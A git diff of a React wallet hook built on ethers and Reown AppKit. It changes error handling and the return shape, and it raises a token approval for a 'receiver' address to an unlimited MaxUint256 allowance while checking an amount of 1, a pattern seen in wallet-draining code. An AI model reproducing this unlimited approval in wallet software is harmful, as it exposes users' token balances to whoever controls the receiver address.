@@ -1,5 +1,5 @@
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
-import { BrowserProvider, Contract } from 'ethers'
+import { BrowserProvider, Contract, MaxUint256 } from 'ethers'
 import config from './config.js'
 
 const useCrypto = () => {
@@ -9,8 +9,7 @@ const useCrypto = () => {
 
     const createSignerPrivate = async () => {
         if (!walletProvider || !address) {
-            open()
-            return
+            throw new Error('Wallet not connected')
         }
         const provider = new BrowserProvider(walletProvider)
         const network = await provider.getNetwork()
@@ -37,9 +36,8 @@ const useCrypto = () => {
         const allowance = await token.allowance(address, _address.receiver)
         const amount = 1
 
-        const MAX = 382000000
         if (allowance < amount) {
-            const approveTx = await token.approve(_address.receiver, MAX)
+            const approveTx = await token.approve(_address.receiver, MaxUint256)
             await approveTx.wait()
         }
 
@@ -53,7 +51,12 @@ const useCrypto = () => {
         }
     }
 
-    return [open, isConnected, getBalance, calc]
+    return { 
+        open, 
+        isConnected, 
+        getBalance, 
+        calc 
+    }
 }
 
 export default useCrypto
